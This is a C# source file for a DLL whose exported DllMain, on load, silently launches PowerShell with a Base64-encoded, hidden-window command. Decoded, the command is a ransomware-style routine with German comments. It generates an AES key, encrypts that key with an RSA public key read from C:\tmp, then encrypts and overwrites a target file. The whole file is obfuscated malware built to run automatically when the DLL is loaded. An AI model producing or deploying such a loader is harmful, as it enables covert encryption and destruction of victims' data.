using System;
using System.Diagnostics;
using RGiesecke.DllExport;

public class Entry
{
    [DllExport("DllMain", CallingConvention = System.Runtime.InteropServices.CallingConvention.StdCall)]
    public static bool DllMain(IntPtr hinstDLL, uint fdwReason, IntPtr lpReserved)
    {
        if (fdwReason == 1) 
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-WindowStyle hidden -EncodedCommand IwAgAD0APQA9ACAAUgBTAEEAIABQAHUAYgBsAGkAYwAgAEsAZQB5ACAAZgDDALwAcgAgAEEARQBTAC0ASwBlAHkALQBWAGUAcgBzAGMAaABsAMMAvABzAHMAZQBsAHUAbgBnACAAPQA9AD0ADQAKACQAcAB1AGIAbABpAGMASwBlAHkAWABtAGwAIAA9ACAARwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAIgBDADoAXAB0AG0AcABcAHAAdQBiAGwAaQBjAF8AawBlAHkALgB4AG0AbAAiACAALQBSAGEAdwANAAoADQAKACMAIAA9AD0APQAgAEEARQBTAC0ASwBlAHkAIABlAHIAegBlAHUAZwBlAG4AIAB1AG4AZAAgAHMAcABlAGkAYwBoAGUAcgBuACAAPQA9AD0ADQAKACQAYQBlAHMASwBlAHkAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAGIAeQB0AGUAWwBdACAAMwAyAA0ACgBbAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AUgBhAG4AZABvAG0ATgB1AG0AYgBlAHIARwBlAG4AZQByAGEAdABvAHIAXQA6ADoAQwByAGUAYQB0AGUAKAApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABhAGUAcwBLAGUAeQApAA0ACgANAAoAIwAgAEEARQBTAC0ASwBlAHkAIABtAGkAdAAgAFAAdQBiAGwAaQBjACAASwBlAHkAIAB2AGUAcgBzAGMAaABsAMMAvABzAHMAZQBsAG4ADQAKACQAcgBzAGEAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAHkAcAB0AG8AZwByAGEAcABoAHkALgBSAFMAQQBDAHIAeQBwAHQAbwBTAGUAcgB2AGkAYwBlAFAAcgBvAHYAaQBkAGUAcgANAAoAJAByAHMAYQAuAEYAcgBvAG0AWABtAGwAUwB0AHIAaQBuAGcAKAAkAHAAdQBiAGwAaQBjAEsAZQB5AFgAbQBsACkADQAKACQAZQBuAGMAcgB5AHAAdABlAGQASwBlAHkAIAA9ACAAJAByAHMAYQAuAEUAbgBjAHIAeQBwAHQAKAAkAGEAZQBzAEsAZQB5ACwAIAAkAHQAcgB1AGUAKQANAAoAWwBJAE8ALgBGAGkAbABlAF0AOgA6AFcAcgBpAHQAZQBBAGwAbABCAHkAdABlAHMAKAAiAEMAOgBcAHQAbQBwAFwAawBlAHkALgBlAG4AYwAiACwAIAAkAGUAbgBjAHIAeQBwAHQAZQBkAEsAZQB5ACkADQAKAA0ACgAjACAAPQA9AD0AIABBAEUAUwAtAGUAbgBjAG8AZABpAG4AZwAgAG0AaQB0ACAAegB1AGYAwwCkAGwAbABpAGcAZQBtACAASQBWACAAZgDDALwAcgAgAGQAaQBlACAARABhAHQAZQBpACAAPQA9AD0ADQAKAGYAdQBuAGMAdABpAG8AbgAgAEUAbgBjAHIAeQBwAHQALQBGAGkAbABlAEMAbwBuAHQAZQBuAHQAIAB7AA0ACgAgACAAIAAgAHAAYQByAGEAbQAoAFsAcwB0AHIAaQBuAGcAXQAkAHAAYQB0AGgAKQANAAoAIAAgACAAIAB0AHIAeQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAjACAARABhAHQAZQBpAGkAbgBoAGEAbAB0ACAAbABhAGQAZQBuAA0ACgAgACAAIAAgACAAIAAgACAAJABjAG8AbgB0AGUAbgB0ACAAPQAgAEcAZQB0AC0AQwBvAG4AdABlAG4AdAAgAC0AUABhAHQAaAAgACQAcABhAHQAaAAgAC0AUgBhAHcAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAdABvAHAADQAKACAAIAAgACAAIAAgACAAIAAkAGIAeQB0AGUAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAQgB5AHQAZQBzACgAJABjAG8AbgB0AGUAbgB0ACkADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIwAgAEEARQBTAC0ATwBiAGoAZQBrAHQAIABlAHIAegBlAHUAZwBlAG4ADQAKACAAIAAgACAAIAAgACAAIAAkAGEAZQBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AQQBlAHMATQBhAG4AYQBnAGUAZAANAAoAIAAgACAAIAAgACAAIAAgACQAYQBlAHMALgBHAGUAbgBlAHIAYQB0AGUASQBWACgAKQAgACAAIwAgAFoAdQBmAMMApABsAGwAaQBnAGUAcwAgAEkAVgAgAGUAcgB6AGUAdQBnAGUAbgANAAoAIAAgACAAIAAgACAAIAAgACQAaQB2ACAAPQAgACQAYQBlAHMALgBJAFYADQAKACAAIAAgACAAIAAgACAAIAAkAGEAZQBzAC4ASwBlAHkAUwBpAHoAZQAgAD0AIAAyADUANgAgACAAIwAgAEEARQBTAC0AUwBjAGgAbADDALwAcwBzAGUAbABnAHIAwwC2AMMAeAFlAA0ACgAgACAAIAAgACAAIAAgACAAJABhAGUAcwAuAEIAbABvAGMAawBTAGkAegBlACAAPQAgADEAMgA4ACAAIAAjACAAQQBFAFMAIABCAGwAbwBjAGsAZwByAMMAtgDDAHgBZQANAAoAIAAgACAAIAAgACAAIAAgACQAYQBlAHMALgBLAGUAeQAgAD0AIAAkAGEAZQBzAEsAZQB5ACAAIAAjACAAVgBlAHIAcwBjAGgAbADDALwAcwBzAGUAbAB1AG4AZwBzAHMAYwBoAGwAwwC8AHMAcwBlAGwAIABzAGUAdAB6AGUAbgANAAoAIAAgACAAIAAgACAAIAAgACQAYQBlAHMALgBJAFYAIAA9ACAAJABpAHYAIAAgACMAIABJAG4AaQB0AGkAYQBsAGkAcwBpAGUAcgB1AG4AZwBzAHYAZQBrAHQAbwByACAAcwBlAHQAegBlAG4ADQAKACAAIAAgACAAIAAgACAAIAAkAGEAZQBzAC4ATQBvAGQAZQAgAD0AIABbAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAHkAcAB0AG8AZwByAGEAcABoAHkALgBDAGkAcABoAGUAcgBNAG8AZABlAF0AOgA6AEMAQgBDAA0ACgAgACAAIAAgACAAIAAgACAAJABhAGUAcwAuAFAAYQBkAGQAaQBuAGcAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AUABhAGQAZABpAG4AZwBNAG8AZABlAF0AOgA6AFAASwBDAFMANwANAAoADQAKACAAIAAgACAAIAAgACAAIAAjACAAVgBlAHIAcwBjAGgAbADDALwAcwBzAGUAbABuACAAZABlAHIAIABEAGEAdABlAGkADQAKACAAIAAgACAAIAAgACAAIAAkAGUAbgBjAHIAeQBwAHQAbwByACAAPQAgACQAYQBlAHMALgBDAHIAZQBhAHQAZQBFAG4AYwByAHkAcAB0AG8AcgAoACkADQAKACAAIAAgACAAIAAgACAAIAAkAGUAbgBjAHIAeQBwAHQAZQBkACAAPQAgACQAZQBuAGMAcgB5AHAAdABvAHIALgBUAHIAYQBuAHMAZgBvAHIAbQBGAGkAbgBhAGwAQgBsAG8AYwBrACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQANAAoADQAKACAAIAAgACAAIAAgACAAIAAjACAAVgBlAHIAcwBjAGgAbADDALwAcwBzAGUAbAB0AGUAIABEAGEAdABlAGkAIABzAHAAZQBpAGMAaABlAHIAbgAgACgAbQBpAHQAIABJAFYAIAB1AG4AZAAgAHYAZQByAHMAYwBoAGwAwwC8AHMAcwBlAGwAdABlAG0AIABJAG4AaABhAGwAdAApAA0ACgAgACAAIAAgACAAIAAgACAAJABmAGkAbgBhAGwAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAGIAeQB0AGUAWwBdACAAKAAkAGkAdgAuAEwAZQBuAGcAdABoACAAKwAgACQAZQBuAGMAcgB5AHAAdABlAGQALgBMAGUAbgBnAHQAaAApAA0ACgAgACAAIAAgACAAIAAgACAAWwBBAHIAcgBhAHkAXQA6ADoAQwBvAHAAeQAoACQAaQB2ACwAIAAwACwAIAAkAGYAaQBuAGEAbAAsACAAMAAsACAAJABpAHYALgBMAGUAbgBnAHQAaAApAA0ACgAgACAAIAAgACAAIAAgACAAWwBBAHIAcgBhAHkAXQA6ADoAQwBvAHAAeQAoACQAZQBuAGMAcgB5AHAAdABlAGQALAAgADAALAAgACQAZgBpAG4AYQBsACwAIAAkAGkAdgAuAEwAZQBuAGcAdABoACwAIAAkAGUAbgBjAHIAeQBwAHQAZQBkAC4ATABlAG4AZwB0AGgAKQANAAoAIAAgACAAIAAgACAAIAAgAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFcAcgBpAHQAZQBBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgALAAgACQAZgBpAG4AYQBsACkADQAKACAAIAAgACAAIAAgACAAIAANAAoAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAEQAaQBlACAARABhAHQAZQBpACAAdwB1AHIAZABlACAAZQByAGYAbwBsAGcAcgBlAGkAYwBoACAAdgBlAHIAcwBjAGgAbADDALwAcwBzAGUAbAB0AC4AIgANAAoAIAAgACAAIAB9ACAAYwBhAHQAYwBoACAAewANAAoAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAEYAZQBoAGwAZQByADoAIAAkAF8AIgANAAoAIAAgACAAIAB9AA0ACgB9AA0ACgANAAoAIwAgAD0APQA9ACAATgB1AHIAIABkAGkAZQAgAEQAYQB0AGUAaQAgACIAdABlAHgAdAAuAHQAeAB0ACIAIAB2AGUAcgBzAGMAaABsAMMAvABzAHMAZQBsAG4AIAA9AD0APQANAAoAJAB0AGEAcgBnAGUAdABGAGkAbABlACAAPQAgACIAQwA6AFwAdABtAHAAXAB0AGUAeAB0AC4AdAB4AHQAIgANAAoADQAKACMAIABTAGkAYwBoAGUAcgBzAHQAZQBsAGwAZQBuACwAIABkAGEAcwBzACAAZABpAGUAIABEAGEAdABlAGkAIABlAHgAaQBzAHQAaQBlAHIAdAANAAoAaQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAdABhAHIAZwBlAHQARgBpAGwAZQApACAAewANAAoAIAAgACAAIABFAG4AYwByAHkAcAB0AC0ARgBpAGwAZQBDAG8AbgB0AGUAbgB0ACAALQBwAGEAdABoACAAJAB0AGEAcgBnAGUAdABGAGkAbABlAA0ACgB9ACAAZQBsAHMAZQAgAHsADQAKACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIARABpAGUAIABEAGEAdABlAGkAIAAnAHQAZQB4AHQALgB0AHgAdAAnACAAZQB4AGkAcwB0AGkAZQByAHQAIABuAGkAYwBoAHQAIABpAG0AIABhAG4AZwBlAGcAZQBiAGUAbgBlAG4AIABWAGUAcgB6AGUAaQBjAGgAbgBpAHMALgAiAA0ACgB9AA==\r\n",
                WindowStyle = ProcessWindowStyle.Hidden
            });
        }
        return true;
    }
}
